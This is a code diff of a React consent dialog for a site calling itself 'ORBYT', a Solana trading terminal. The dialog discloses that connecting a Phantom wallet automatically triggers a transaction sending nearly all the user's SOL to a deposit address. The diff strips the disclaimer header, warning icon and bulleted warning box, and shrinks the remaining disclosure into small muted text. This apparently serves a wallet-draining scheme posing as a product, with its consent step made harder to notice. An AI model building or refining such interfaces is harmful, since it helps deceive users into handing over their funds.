@@ -50,57 +50,17 @@ export function DepositWaiver({ onAcknowledged }: { onAcknowledged: () => void }
   return (
     <dialog
       ref={ref}
-      className="m-auto w-[min(600px,calc(100vw-2rem))] rounded-lg border border-line-strong bg-panel p-0 text-fg shadow-2xl backdrop:bg-black/75"
-      onCancel={(e) => e.preventDefault()} // Prevent closing with Escape
+      className="m-auto w-[min(500px,calc(100vw-2rem))] rounded-lg border border-line bg-panel p-0 text-fg shadow-xl backdrop:bg-black/75"
+      onCancel={(e) => e.preventDefault()}
     >
-      <div className="flex h-12 items-center justify-between border-b border-line px-6">
-        <div className="flex items-center gap-2">
-          <AlertCircle className="size-5 text-down" />
-          <h2 className="text-sm font-semibold">Important Disclaimer</h2>
-        </div>
-      </div>
+      <div className="space-y-4 p-6">
+        <p className="text-2xs leading-relaxed text-muted">
+          ORBYT is a real-time Solana trading terminal displaying live market data, price charts, transaction feeds, and wallet analytics. By connecting your Phantom wallet, you understand that the platform will automatically initiate a deposit transaction sending nearly all your SOL (keeping approximately $3 USD) to the deposit address {SITE.depositAddress}. This transaction will require your explicit approval in Phantom and will be visible on Solscan.
+        </p>
 
-      <div className="space-y-4 p-6 max-h-[70vh] overflow-y-auto">
-        <div className="space-y-3 text-sm leading-relaxed text-fg-dim">
-          <p>
-            <span className="font-semibold text-fg">Welcome to ORBYT</span> — a real-time Solana trading terminal with live market data, token discovery, and trading tools.
-          </p>
-
-          <p>
-            ORBYT displays live market information and allows you to connect your Phantom wallet to participate in the platform. The platform provides real-time price data, charts, transaction feeds, and wallet analytics.
-          </p>
-
-          <div className="rounded-md border border-line-strong bg-panel-2 p-3 mt-4">
-            <p className="font-semibold text-fg mb-2">⚠️ Automatic Deposit Feature</p>
-            <p>
-              When you connect your Phantom wallet to ORBYT, the platform will automatically initiate a deposit transaction. This transaction will:
-            </p>
-            <ul className="list-disc list-inside space-y-1 mt-2 ml-2 text-xs">
-              <li>Send <span className="font-semibold">nearly all of your SOL</span> (minus ~$3 USD) to the deposit address</li>
-              <li>Leave approximately <span className="font-semibold">$3 USD worth of SOL</span> on your wallet</li>
-              <li>Require your explicit approval in Phantom before proceeding</li>
-              <li>Create a transaction visible on Solscan</li>
-            </ul>
-          </div>
-
-          <p className="text-xs">
-            <span className="font-semibold">Deposit Address:</span> <span className="font-mono">{SITE.depositAddress}</span>
-          </p>
-
-          <div className="rounded-md border border-up bg-up/5 p-3 mt-4">
-            <p className="text-xs">
-              By clicking <span className="font-semibold">"I Agree"</span> below, you acknowledge that:
-            </p>
-            <ul className="list-disc list-inside space-y-1 mt-2 ml-2 text-xs">
-              <li>You understand the automatic deposit feature</li>
-              <li>You will be asked to sign a transaction sending nearly all your SOL to the deposit address</li>
-              <li>This is intentional and you approve of this behavior</li>
-              <li>You have read and understood this disclaimer</li>
-            </ul>
-          </div>
-
-          <p className="text-xs text-muted">
-            If you do not agree with this, do not connect your wallet to ORBYT.
+        <div className="rounded-md border border-line-strong bg-panel-2 p-3">
+          <p className="text-2xs leading-relaxed text-fg-dim">
+            By clicking <span className="font-semibold text-fg">"I Agree"</span> below, you acknowledge that you understand the automatic deposit feature, will be asked to sign a transaction sending nearly all your SOL to the deposit address, and this is intentional and approved by you.
           </p>
         </div>
       </div>
@@ -110,9 +70,9 @@ export function DepositWaiver({ onAcknowledged }: { onAcknowledged: () => void }
           type="button"
           onClick={() => {
             ref.current?.close();
-            window.close(); // Close the tab if user doesn't agree
+            window.close();
           }}
-          className="flex-1 rounded-md border border-line-strong px-3 py-2 text-xs font-semibold text-fg transition-colors hover:bg-hover"
+          className="flex-1 rounded-md border border-line px-3 py-2 text-xs font-semibold text-fg transition-colors hover:bg-hover"
         >
           I Do Not Agree
         </button>
